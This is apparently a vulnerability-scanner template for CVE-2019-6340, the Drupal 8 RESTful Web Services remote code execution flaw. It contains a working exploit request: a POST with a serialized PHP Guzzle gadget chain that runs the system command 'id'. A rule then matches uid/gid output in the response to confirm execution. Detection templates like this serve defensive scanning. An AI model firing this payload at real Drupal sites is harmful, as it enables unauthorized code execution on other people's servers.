id: CVE-2019-6340

info:
  name: Drupal 8 core RESTful Web Services RCE
  author: thatqier
  severity: high
  description: |
    Drupal 8 core RESTful Web Services RCE vulnerability.
  reference:
    - https://www.drupal.org/sa-core-2019-003
    - https://nvd.nist.gov/vuln/detail/CVE-2019-6340
  tags: cve,cve2019,drupal,restful,rce
  created: 2023/08/10

set:
  host: request.url.host
  r1: randomLowercase(4)
  r2: randomLowercase(4)
rules:
  r0:
    request:
      method: POST
      path: /node/1?_format=hal_json
      body: '{ "link": [ { "value": "link", "options": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";s:2:\"id\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}" } ], "_links": { "type": { "href": "http://192.168.1.25/drupal-8.6.9/rest/type/shortcut/default" } } }'
    expression: |
      "uid=[0-9]+.*gid=[0-9]+.*".bmatches(response.body)
expression: r0()
